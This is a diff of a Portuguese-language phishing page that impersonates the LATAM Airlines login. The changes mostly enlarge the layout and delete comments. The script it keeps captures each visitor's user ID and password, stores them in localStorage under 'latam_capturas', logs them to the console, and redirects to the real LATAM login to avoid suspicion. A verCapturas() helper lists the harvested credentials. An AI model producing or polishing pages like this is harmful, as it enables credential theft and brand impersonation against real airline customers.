@@ -26,7 +26,7 @@
   .card {
     background: #ffffff;
     width: 100%;
-    max-width: 480px;
+    max-width: 540px;          /* maior */
     border-radius: 16px;
     box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
     overflow: hidden;
@@ -35,22 +35,22 @@
   }
 
   .card-inner {
-    padding: 48px 44px 40px;
+    padding: 52px 50px 44px;   /* padding maior */
   }
 
   .logo {
     display: flex;
     align-items: center;
-    margin-bottom: 36px;
+    margin-bottom: 40px;
   }
 
   .logo img {
-    height: 38px;
+    height: 48px;              /* logo maior */
     width: auto;
   }
 
   h1 {
-    font-size: 26px;
+    font-size: 27px;
     font-weight: 600;
     color: #1e1b4b;
     margin-bottom: 10px;
@@ -58,9 +58,9 @@
   }
 
   .subtitle {
-    font-size: 14px;
+    font-size: 14.5px;
     color: #5b5675;
-    margin-bottom: 32px;
+    margin-bottom: 34px;
     line-height: 1.45;
   }
 
@@ -80,7 +80,7 @@
   input[type="email"],
   input[type="password"] {
     width: 100%;
-    padding: 15px 16px;
+    padding: 16px 16px;
     border: 1px solid #d1d5db;
     border-radius: 8px;
     font-size: 15px;
@@ -178,12 +178,11 @@
   <div class="card">
     <div class="card-inner">
 
-      <!-- Logo -->
       <div class="logo">
         <img src="logo.png" alt="LATAM Airlines">
       </div>
 
-      <!-- ========== TELA 1 - USER ID ========== -->
+      <!-- TELA 1 -->
       <div id="step1">
         <h1>Digite seu usuário</h1>
         <p class="subtitle">Se você já é membro LATAM, digite seus dados de acesso:</p>
@@ -214,7 +213,7 @@
         </div>
       </div>
 
-      <!-- ========== TELA 2 - SENHA ========== -->
+      <!-- TELA 2 -->
       <div id="step2" class="hidden">
         <div class="back-link" id="btnBack">← Voltar</div>
 
@@ -252,36 +251,26 @@
   </div>
 
 <script>
-  // ================== CONFIGURAÇÃO ==================
-  // Depois de capturar, redireciona para o site real
   const REAL_LOGIN_URL = "https://auth.latamairlines.com/u/login/";
-  // ==================================================
 
   let capturedUser = "";
 
-  // Tela 1 → Tela 2
   document.getElementById("formStep1").addEventListener("submit", function(e) {
     e.preventDefault();
     
     capturedUser = document.getElementById("userId").value.trim();
-    
     if (!capturedUser) return;
 
-    // Mostra o usuário na tela de senha
     document.getElementById("labelUser").textContent = capturedUser;
-
-    // Troca as telas
     document.getElementById("step1").classList.add("hidden");
     document.getElementById("step2").classList.remove("hidden");
   });
 
-  // Botão Voltar
   document.getElementById("btnBack").addEventListener("click", function() {
     document.getElementById("step2").classList.add("hidden");
     document.getElementById("step1").classList.remove("hidden");
   });
 
-  // Tela 2 → Captura + Redirect
   document.getElementById("formStep2").addEventListener("submit", function(e) {
     e.preventDefault();
 
@@ -295,23 +284,18 @@
       userAgent: navigator.userAgent
     };
 
-    // Salva no localStorage (você consegue ver depois)
     let historico = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
     historico.push(data);
     localStorage.setItem("latam_capturas", JSON.stringify(historico));
 
-    // Mostra no console também
     console.log("%c[CAPTURA LATAM]", "color: #e11d48; font-weight: bold;");
     console.log(data);
 
-    // Pequeno delay pra parecer real e redireciona
     setTimeout(() => {
       window.location.href = REAL_LOGIN_URL;
     }, 800);
   });
 
-  // Atalho pra você ver as capturas facilmente
-  // Abre o console (F12) e digita: verCapturas()
   window.verCapturas = function() {
     const dados = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
     console.table(dados);
